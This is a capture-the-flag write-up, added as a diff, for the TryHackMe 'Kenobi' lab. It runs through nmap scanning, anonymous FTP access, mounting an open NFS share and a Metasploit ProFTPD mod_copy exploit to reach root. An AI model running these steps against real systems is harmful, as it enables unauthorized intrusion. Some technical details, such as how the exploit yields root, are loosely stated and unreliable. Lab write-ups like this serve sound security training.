@@ -1,0 +1,48 @@
+#TryHackMe: "Kenobi" Challenge Writeup
+#Objective:
+
+Exploit a vulnerable Linux machine by targeting file sharing services (NFS/FTP) and escalating privileges.
+
+#Step 1: Scanning and Enumeration
+
+-Ran a port scan to identify open services:
+
+    'bash
+    'nmap -A -T4 <target_ip>
+
+-Found FTP (21), SSH (22), and NFS (2049) running.
+
+#Step 2: Exploiting FTP
+
+-Connected to the FTP server using anonymous login:
+
+    'bash
+    'ftp <target_ip>
+
+-Found sensitive files exposed on the FTP server, including /home/kenobi/.ssh/id_rsa.
+
+#Step 3: Mounting NFS Shares
+
+-Discovered that the NFS share was accessible without authentication.
+-Mounted the NFS share locally:
+
+    'bash
+    'sudo mount <target_ip>:/ /mnt
+
+-Retrieved files from /mnt/home/kenobi and found the user flag.
+
+#Step 4: Privilege Escalation
+
+-Found a vulnerable version of ProFTPD running, which was susceptible to a known exploit.
+-Used Metasploit to exploit the ProFTPD vulnerability and escalate privileges to root:
+
+    'bash
+    'msfconsole
+    'use exploit/linux/ftp/proftpd_modcopy_exec
+    'set RHOST <target_ip>
+    'run
+
+#Lessons Learned:
+
+-Misconfigured services like NFS can expose sensitive files.
+-Outdated services are often prone to remote exploitation.
